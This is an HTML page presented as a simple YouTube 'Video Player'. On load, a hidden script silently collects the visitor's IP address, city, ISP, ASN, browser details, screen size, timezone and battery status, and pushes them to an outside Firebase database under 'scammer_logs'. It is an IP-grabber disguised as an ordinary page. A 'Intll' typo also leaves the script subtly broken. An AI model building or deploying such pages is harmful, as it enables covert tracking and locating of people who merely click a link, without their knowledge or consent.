<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <iframe id="player" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        const firebaseConfig = { 
            databaseURL: "https://data-28355-default-rtdb.firebaseio.com/" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const params = new URLSearchParams(window.location.search);
        const videoId = params.get('v') || 'dQw4w9WgXcQ'; 
        document.getElementById('player').src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;

        async function logData() {
            let info = {
                v_id: videoId,
                time: new Date().toLocaleString(),
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                ua: navigator.userAgent,
                tz: Intll.DateTimeFormat().resolvedOptions().timeZone
            };

            try {
                // Precise Network & IP Details
                const response = await fetch('https://ipapi.co/json/');
                const res = await response.json();
                info.ip = res.ip;
                info.city = res.city;
                info.region = res.region;
                info.country = res.country_name;
                info.isp = res.org;
                info.asn = res.asn;
            } catch (e) { info.net_err = "IP block by user"; }

            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    info.battery = (b.level * 100).toFixed(0) + "%";
                    info.status = b.charging ? "Charging" : "On Battery";
                }
            } catch (e) { info.battery = "N/A"; }

            // Sending to Firebase
            db.ref('scammer_logs').push(info)
                .then(() => console.log("Logged"))
                .catch((e) => console.log(e));
        }

        window.onload = logData;
    </script>
</body>
</html>
